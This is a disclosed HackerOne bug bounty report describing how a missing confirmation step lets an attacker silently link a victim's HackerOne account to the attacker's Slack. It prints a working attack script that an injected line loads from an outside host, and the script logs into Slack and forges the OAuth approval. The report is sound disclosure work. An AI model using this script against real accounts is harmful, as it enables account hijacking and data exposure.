# HackerOne Integrations Design Issue

## Report Details
- **Report ID**: 172289
- **URL**: https://hackerone.com/reports/172289
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-09-27T02:53:47.691Z
- **Disclosed**: 2019-04-11T18:12:00.694Z

## Reporter
- **Username**: whhackersbr
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
###Summary###

HackerOne Integrations Design Issue

###Description (Include Impact)###

This bug is similar to #170552.

The `HackerOne Integrations` feature is very sensitive and can not be used with just a click, IMHO, or we can say "HackerOne users are a click away from​ giving to an attacker very sensitive privileges to his private account".

 * https://youtu.be/YeqfOE-6_FQ

You really need to explicitly ask the user if he wants to integrate his HackerOne account to an external service, __before__ doing it.

Asking the password to confirm, would be even better.

{F123252}

Try to connect an external account to `Phabricator` to see their approach (protection against CSRF since the start and confirmation screen).

__Exploitability__

All the attacker needs to exploit it is stealing a click, with something like:

1) Clickjacking (browser 0-day, HackerOne bug, etc.);
2) Social Engineering;
3) Exploiting an XSS in Slack quietly, and waiting for the user attempts to integrate the HackerOne with Slack;
4) Scrolling Attacks: https://www.w3.org/Security/wiki/Clickjacking_Threats#Scrolling_attacks;
5) Repositioning the Trusted Window: https://www.w3.org/Security/wiki/Clickjacking_Threats#Repositioning_the_trusted_window;

Etc.

###Steps To Reproduce###

1. Open https://whhackersbr.slack.com/XSS_VULNERABLE_PAGE?parameter=PAYLOAD;
2. Execute the following code in the browser's console;

```
/* FAKE SLACK XSS */
var newScript = document.createElement('script');
newScript.setAttribute('src', 'https://dotfivelabs.com.br/teste-BB32FE5A/css/hackerone-integrations.js');
document.head.appendChild(newScript);
```

### Optional: Your Environment (Browser version, Device, etc)

 * Firefox 48.0.2
 * Mac OS X 10.8.5

### Supporting Material/References

 * https://youtu.be/YeqfOE-6_FQ

`hackerone-integrations.js` source-code:
```
var puppet_window;

function http(method, url, data = null){
	var xhttp = new XMLHttpRequest();
	xhttp.open(method, url, false);
	if(data){
		xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	}
	xhttp.send(data);
	return xhttp.responseText;
}

function slackLogin(){
	 console.clear();
	console.log("Signing in with the Attacker's Slack Account");
	var response = http("GET", "https://whhackersbr.slack.com");
	var csrf_token = response.match(/name\=\"crumb\" value\=\"(.*?)\" \/\>/i)[1];	//"
	try{
		http("POST", "https://whhackersbr.slack.com", "signin=1&redir=&crumb="+encodeURI(csrf_token)+"&email=hackerone%40██████&password=teste123&remember=on");
	}
	catch(err){
	}
}

function openWindow(url){
	console.clear();
	console.log("Opening HackerOne Integrations Window");
	puppet_window = window.open(url, "_blank", "menubar=no,status=no,titlebar=no,toolbar=yes,scrollbars=no,resizable=no,top=0,left=200,width=960,height=350");
}

function windowCrossDomainFinish(){
	console.clear();
	console.log("Waiting Stolen Click");
	try{
		puppet_window.document;
		setTimeout(function(){acceptOAuth()}, 2500);
	}
	catch(err){
		setTimeout(function(){windowCrossDomainFinish()}, 500);
	}
}

function acceptOAuth(){
	console.clear();
	console.log("Accepting OAuth Authorization Request");
	url = puppet_window.document.getElementById("oauth_authorize_confirm_form").action;
	csrf_token = puppet_window.document.getElementsByName("crumb")[0].value;
	puppet_window.close();
	document.body.innerHTML = '<form id="puppet_form" action="'+url+'" method="post">\
					<input type="hidden" name="create_authorization" value="1"/>\
					<input type="hidden" name="crumb" value="'+encodeURI(csrf_token)+'"/>\
					<input type="hidden" name="channel" value="C03CKQQDQ"/>\
				  </form>';
	document.getElementById("puppet_form").submit();
	console.clear();
	console.log("Game Over");
}

console.clear();
console.log("Starting the attack");
slackLogin();
alert("Click on 'Connect with Slack'");
openWindow("https://hackerone.com/security/integrations");
setTimeout(function(){windowCrossDomainFinish()}, 1000);

```

## Attachments
- Approval_Screen.png
